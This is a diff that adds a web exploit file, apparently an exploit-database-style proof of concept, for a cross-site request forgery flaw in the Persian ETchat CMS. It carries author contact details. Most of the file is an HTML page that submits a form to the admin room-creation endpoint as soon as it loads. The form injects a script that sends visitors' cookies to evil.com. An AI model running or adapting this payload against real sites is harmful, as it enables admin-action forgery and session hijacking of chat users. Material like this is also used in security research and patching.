@@ -1,0 +1,41 @@
+# Exploit Title: ETchat(persian version) CMS Xsrf vulnerability
+# Exploit Author: Hesam Bazvand
+# Contact: https://www.facebook.com/hesam.king73
+# Software Link: http://dl.20script.ir/script/chat/et-chat-3.7-Persian(www.20script.ir).zip
+# Tested on: Windows 7 / Kali Linux
+# Category: WebApps
+# Dork : User Your Mind ! :D
+# Email : Black.king066@gmail.com
+#special thanks to my best friend Aryan Bayani Nejad
+
+<html>
+<body onload="document.frm1.submit()" >
+
+<script>
+var f = document.createElement("form");
+f.setAttribute('method',"post");
+f.setAttribute('name',"frm1");
+f.setAttribute('action',"http://localhost/etchat/?AdminCreateNewRoom");
+
+var i = document.createElement("input"); //input element, text
+i.setAttribute('type',"text");
+i.setAttribute('name',"room");
+i.setAttribute('value',"<ScRiPt \>window.location.replace(\"http://evil.com\" + encodeURIComponent(document.cookie))\</ScRiPt\>");
+
+
+
+f.appendChild(i);
+
+
+//and some more input elements here
+//and dont forget to add a submit button
+
+document.getElementsByTagName('body')[0].appendChild(f);
+
+</script>
+
+
+
+
+</body>
+</html>
